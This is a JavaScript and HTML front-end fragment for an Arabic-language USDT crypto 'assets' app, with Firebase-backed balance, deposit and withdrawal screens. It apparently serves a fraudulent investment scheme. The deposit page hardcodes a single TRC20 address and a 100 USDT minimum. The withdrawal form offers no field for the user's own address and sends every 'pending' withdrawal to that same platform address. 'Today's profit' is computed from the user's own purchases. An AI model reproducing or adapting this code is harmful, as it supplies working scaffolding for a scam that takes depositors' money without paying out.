astHTML='<div class="astin" dir="ltr"><div class="acard"><div><div class="albl">إجمالي الأصول (USDT)<svg id="ey" onclick="tgE()" viewBox="0 0 24 24"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></div><div class="aval" id="av">0.00</div></div><div class="aday"><div class="albl2">أرباح اليوم</div><div class="aval2" id="ady">0</div></div></div><div class="abtns"><button class="abtn dep" onclick="openDep()"><img src="https://i.ibb.co/FbbVgh74/IMG.png" alt="">الإيداع</button><button class="abtn wd" onclick="openWd()"><img src="https://i.ibb.co/DDgGy91y/IMG.png" alt="">سحب العملات</button></div><div class="atabs"><div class="atab on">الأصول</div><div class="atab">إجمالي الأصول</div><div class="arec"><svg viewBox="0 0 24 24"><rect x="5" y="3.5" width="14" height="17" rx="2"/><path d="M9 8.5h6M9 12h6M9 15.5h4"/></svg>السجل</div></div><div class="arow"><span>حساب الأموال</span><b id="fundV">0 USDT</b></div><div class="arow"><span>أرباح الفريق</span><b>0.00 USDT</b></div></div>';
var depHTML='<div class="dpin"><div class="wdt"><div class="pfb" onclick="closeDep()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1>الإيداع في العملة</h1><div class="wdb" onclick="openRec(\'dep\')"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div><div class="dsub">اختيار العملة</div><div class="dnet"><span>USDT-TRC20</span><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div><div class="dqrw"><div class="dqr"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAAE2AQAAAADDx4MEAAACHklEQVR4nO2aQYrkMAxFv8beOzfoo6Ru0GeamzkHKkiWAzF/FpJdLpqBhmacVEpZFKn4QWyE8qVvC/Gdq/z6FgY49zMOzO2OayBJ0gbSXofSfvZ1XIhLJMkdAIpgmQANyrzaHfNLrOMyXBGRCcAyAbCgtGcicvT83pqb10AAQfNj3HudAwDEL0+2CRqKZbr/v/c6928ukFwBIJFyA4BlKqJCP5u8v8I6rsBFYJP2r0QuH3vk8mkPbCidfh1X4ayC0jIqkaofM6k/9fJ6dxDXtRk1KDtqPB4DHo9BnHaBAAKZUVMDj1YQgczeD47itD9/6Dlzev58cQdmz49RnIbCkkQ/VXv9hiVqznh+jON6/8oSor+am3L2dVyF63JBQ5EB2F0Tes+PYZy5uhmWH52SsCm768cwzvQjJ5prZQUV+5rL/fZhnEm5eutrqP3H2uRkBTwe4zhYBaWpAXRFb4api+v5OC4C6S4AinD5vKvdK81qF6TgfuIRXKDctghmFA0PmvErtxPM7424QMxrkcdWFH9LBHTjUER8v3Yc98XfBUxTuv7c9WMY93S+hF1BpT/VzvJ4jOPa+ZJFRLBMgd0mOrZ49Pzeimt+yY6HoVtr4Hp5fz6Me4pH35DX43Gr9+fHcUXqrmCg3NIfEfnQdv0c87s+F2GuVQHm2qITKHVgi/uR83tDbhMRkainfKqABwKbSDv58wLruAQnfr79VNxfhObGJu8HsgcAAAAASUVORK5CYII=" alt="QR"></div></div><div class="dcpr"><span class="t">عنوان الإيداع في العملة</span><span class="dcp" onclick="cpT(\'TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg\')"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1"/></svg>نسخ</span></div><div class="daddr">TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg</div><div class="wnote"><b>ملاحظة أمنية</b><p>The minimum deposit amount is 100 USDT. Please ensure that the currency and grid information are correct to avoid financial loss. If the deposit currency is incorrect or the deposit amount is less than 100 USDT, the lost funds will be irrecoverable.</p></div></div>';
var d=document.getElementById('dep');if(d){d.className='dpw';d.innerHTML=depHTML}

var AST_FB_CFG={apiKey:"AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",authDomain:"hhhxh-5ebe4.firebaseapp.com",projectId:"hhhxh-5ebe4",storageBucket:"hhhxh-5ebe4.firebasestorage.app",messagingSenderId:"79243000696",appId:"1:79243000696:web:ee0fb2d2ccce791954e68d",measurementId:"G-08BR6LN6PT"};
var astFB={ready:false,uid:null,db:null,auth:null,fs:null};
var astBal=(typeof astBal!=='undefined')?astBal:0;
var astEyeOpen=(typeof astEyeOpen!=='undefined')?astEyeOpen:true;
try{var _astEyeSaved=localStorage.getItem('astEye');if(_astEyeSaved==='0')astEyeOpen=false;}catch(e){}
var AST_EYE_OPEN='<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>';
var AST_EYE_OFF='<path d="M3 3l18 18"/><path d="M10.6 5.1A9.7 9.7 0 0 1 12 5c5 0 9 4.6 10 7-.35.9-1.2 2.3-2.6 3.6M6.6 6.6C4.2 8 2.6 10.4 2 12c1 2.4 5 7 10 7 1.4 0 2.8-.35 4-.95M9.9 9.9a3 3 0 0 0 4.2 4.2"/>';

if(!window.__astInit){
window.__astInit=true;
(async function(){
  try{
    var authM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js');
    var fsM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js');
    astFB.fs=fsM;
    var app=(window.__exFB&&window.__exFB.app)?window.__exFB.app:null;
    if(app){
      astFB.auth=window.__exFB.auth||authM.getAuth(app);
      astFB.db=window.__exFB.db||fsM.getFirestore(app);
    }else{
      var appM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
      var app2;
      try{app2=appM.getApp('trdApp');}catch(e){app2=appM.initializeApp(AST_FB_CFG,'astApp');}
      astFB.auth=authM.getAuth(app2);
      astFB.db=fsM.getFirestore(app2);
    }
    authM.onAuthStateChanged(astFB.auth,async function(u){
      try{
        if(!u){astFB.ready=false;astFB.uid=null;return;}
        astFB.uid=u.uid;
        astFB.ready=true;
        await astLoadUser();
      }catch(e){}
    });
  }catch(e){}
})();
}

async function astLoadUser(){
  try{
    var fs=astFB.fs;
    var snap=await fs.getDoc(fs.doc(astFB.db,'users',astFB.uid));
    if(snap.exists()){
      var d=snap.data()||{};
      var nb=Number(d.balance);
      if(isFinite(nb))astBal=nb;
      astRenderBal();
      var now=Date.now(),day=24*60*60*1000,profit=0;
      (d.records||[]).forEach(function(r){if(r&&r.type==='buy'&&(now-r.at)<day)profit+=Number(r.amount)||0;});
      var ady=document.getElementById('ady');
      if(ady)ady.textContent=profit.toFixed(2);
    }
  }catch(e){}
}

function astRenderBal(){
  var nb=Number(astBal);
  if(!isFinite(nb))nb=0;
  var av=document.getElementById('av');
  if(av){
    var cur=av.textContent.trim();
    if(astEyeOpen){
      av.textContent=nb>0?nb.toFixed(2):(av.dataset.astLast||cur||'0.00');
    }else{
      if(cur&&cur!=='*** ***'&&cur!=='0.00')av.dataset.astLast=cur;
      av.textContent='*** ***';
    }
  }
  var fv=document.getElementById('fundV');
  if(fv){
    var fcur=fv.textContent.replace('USDT','').trim();
    if(astEyeOpen){
      fv.textContent=(nb>0?nb.toFixed(2):(fv.dataset.astLast||fcur||'0.00'))+' USDT';
    }else{
      if(fcur&&fcur!=='*** ***'&&fcur!=='0.00')fv.dataset.astLast=fcur;
      fv.textContent='*** *** USDT';
    }
  }
  var ey=document.getElementById('ey');
  if(ey){var ic=astEyeOpen?AST_EYE_OPEN:AST_EYE_OFF;if(ey.innerHTML!==ic)ey.innerHTML=ic;}
}

async function astRefresh(){
  astRenderBal();
  if(astFB.ready&&astFB.uid){
    try{await astLoadUser();}catch(e){astRenderBal();}
  }
}

if(!window.__astObserver&&typeof MutationObserver!=='undefined'&&document.body){
  window.__astObserver=new MutationObserver(function(){
    var av=document.getElementById('av');
    if(av&&!av.dataset.astBound){
      av.dataset.astBound='1';
      astRefresh();
    }
  });
  window.__astObserver.observe(document.body,{childList:true,subtree:true});
}
astRefresh();

window.tgE=function(){
  astEyeOpen=!astEyeOpen;
  try{localStorage.setItem('astEye',astEyeOpen?'1':'0');}catch(e){}
  astRenderBal();
};

/* ===== قسم السحب (تصميم مطابق للصورة + رصيد حقيقي) ===== */
var wdHTML='<div class="wdin" dir="ltr" style="min-height:100vh;background:linear-gradient(180deg,#0a1a45 0%,#060d26 100%);padding-bottom:40px;">'
+'<div class="wdt"><div class="pfb" onclick="closeWd()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1>سحب العملات</h1><div class="wdb" onclick="openRec(\'wd\')"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div>'
+'<div style="margin:16px 14px 0;padding:16px;border-radius:12px;background:#101c42;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:space-between;"><span style="font-size:16px;font-weight:600;color:#ffffff;letter-spacing:1px;">TRC20</span><svg viewBox="0 0 24 24" style="width:20px;height:20px;stroke:#8fa3d9;fill:none;stroke-width:2;"><path d="M6 9l6 6 6-6"/></svg></div>'
+'<div dir="rtl" style="margin:20px 14px 8px;font-size:15px;font-weight:600;color:#e8ecf8;text-align:right;">عنوان الإرسال</div>'
+'<div style="margin:0 14px;padding:15px 16px;border-radius:12px;background:#0d1737;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:space-between;gap:10px;"><span id="wdaddr" style="font-size:14px;color:#dfe6f7;word-break:break-all;">TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg</span><svg onclick="cpT(\'TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg\')" viewBox="0 0 24 24" style="width:20px;height:20px;min-width:20px;stroke:#8fa3d9;fill:none;stroke-width:2;cursor:pointer;"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1"/></svg></div>'
+'<div style="margin:20px 14px 8px;display:flex;align-items:flex-end;justify-content:space-between;"><div dir="rtl" style="font-size:15px;font-weight:600;color:#e8ecf8;">الكمية المستخرجة</div><div dir="rtl" style="font-size:12px;color:#9fb0dd;text-align:left;">الرصيد المتوفر للسحب (USDT) :$<br><b id="wdbal" style="color:#ffffff;font-size:14px;">0.00</b></div></div>'
+'<div style="margin:0 14px;padding:3px 8px 3px 16px;border-radius:12px;background:#0d1737;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;gap:10px;"><input id="wdamt" type="number" min="0" step="any" placeholder="أدخل الكمية" style="flex:1;background:transparent;border:none;outline:none;color:#ffffff;font-size:15px;padding:12px 0;"><button onclick="wdFillMax()" style="background:transparent;border:none;color:#3b7bff;font-size:14px;font-weight:600;cursor:pointer;white-space:nowrap;padding:8px 4px;">السحب الكامل</button></div>'
+'<div dir="rtl" style="margin:20px 14px 8px;font-size:15px;font-weight:600;color:#e8ecf8;text-align:right;">كلمة مرور التعامل</div>'
+'<div style="margin:0 14px;padding:0 16px;border-radius:12px;background:#0d1737;border:1px solid rgba(255,255,255,0.06);"><input id="wdpass" type="password" placeholder="يرجى إدخال كلمة مرور التعامل" dir="rtl" style="width:100%;background:transparent;border:none;outline:none;color:#ffffff;font-size:15px;padding:15px 0;box-sizing:border-box;"></div>'
+'<button onclick="wdConfirm()" style="margin:24px 14px 0;width:calc(100% - 28px);padding:16px;border:none;border-radius:12px;background:#2f6bff;color:#ffffff;font-size:17px;font-weight:700;cursor:pointer;box-shadow:0 6px 18px rgba(47,107,255,0.35);">تأكيد السحب</button>'
+'<div dir="rtl" style="margin:26px 14px 6px;font-size:15px;font-weight:700;color:#e8ecf8;text-align:right;">ملاحظة أمنية</div>'
+'<div style="margin:0 14px;padding:16px;border-radius:12px;background:rgba(255,255,255,0.05);color:#aeb9dd;font-size:13px;line-height:1.9;">Please check and make sure the address and grid are correct to avoid loss of funds. If you transfer to the wrong address, the lost funds will not be recovered.</div>'
+'</div>';

window.wdFillMax=function(){
  var el=document.getElementById('wdamt');
  if(!el)return;
  var nb=Number(astBal);if(!isFinite(nb)||nb<0)nb=0;
  el.value=nb.toFixed(2);
};

window.openWd=async function(){
  var d=document.getElementById('wd')||document.getElementById('withdraw');
  if(!d){
    d=document.createElement('div');
    d.id='wd';
    document.body.appendChild(d);
  }
  if(!d.parentNode){try{document.body.appendChild(d);}catch(e){}}
  try{d.removeAttribute('hidden');}catch(e){}
  d.className='wdw';
  d.style.cssText='position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;width:100% !important;height:100% !important;z-index:2147483000 !important;overflow-y:auto !important;-webkit-overflow-scrolling:touch;display:block !important;visibility:visible !important;opacity:1 !important;pointer-events:auto !important;';
  d.innerHTML=wdHTML;
  var nb=Number(astBal);if(!isFinite(nb))nb=0;
  var wb=document.getElementById('wdbal');
  if(wb)wb.textContent=nb.toFixed(2);
  try{
    if(astFB.ready&&astFB.uid){
      await astLoadUser();
      var nb2=Number(astBal);if(!isFinite(nb2))nb2=0;
      var wb2=document.getElementById('wdbal');
      if(wb2)wb2.textContent=nb2.toFixed(2);
    }
  }catch(e){}
  try{window.scrollTo(0,0);}catch(e){}
};

window.closeWd=function(){
  var d=document.getElementById('wd')||document.getElementById('withdraw');
  if(d){d.className='';d.innerHTML='';d.style.cssText='display:none !important;';}
};

window.wdConfirm=async function(){
  var amtEl=document.getElementById('wdamt');
  var passEl=document.getElementById('wdpass');
  var amt=parseFloat(amtEl?amtEl.value:'');
  var pass=passEl?passEl.value:'';
  if(!isFinite(amt)||amt<=0){alert('يرجى إدخال كمية صحيحة');return;}
  if(amt<10){alert('الحد الأدنى للسحب هو 10 USDT');return;}
  var nb=Number(astBal);if(!isFinite(nb))nb=0;
  if(amt>nb){alert('الكمية أكبر من الرصيد المتاح للسحب');return;}
  if(!pass){alert('يرجى إدخال كلمة مرور التعامل');return;}
  try{
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      var ref=fs.doc(astFB.db,'users',astFB.uid);
      var snap=await fs.getDoc(ref);
      var d=snap.exists()?(snap.data()||{}):{};
      var cur=Number(d.balance);if(!isFinite(cur))cur=nb;
      if(amt>cur){alert('الكمية أكبر من الرصيد المتاح للسحب');return;}
      var recs=Array.isArray(d.records)?d.records.slice():[];
      recs.push({type:'withdraw',amount:amt,at:Date.now(),addr:'TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg',status:'pending'});
      await fs.updateDoc(ref,{balance:cur-amt,records:recs});
      astBal=cur-amt;
      astRenderBal();
    }
    alert('تم إرسال طلب السحب بنجاح');
    closeWd();
  }catch(e){alert('حدث خطأ، يرجى المحاولة مرة أخرى');}
};
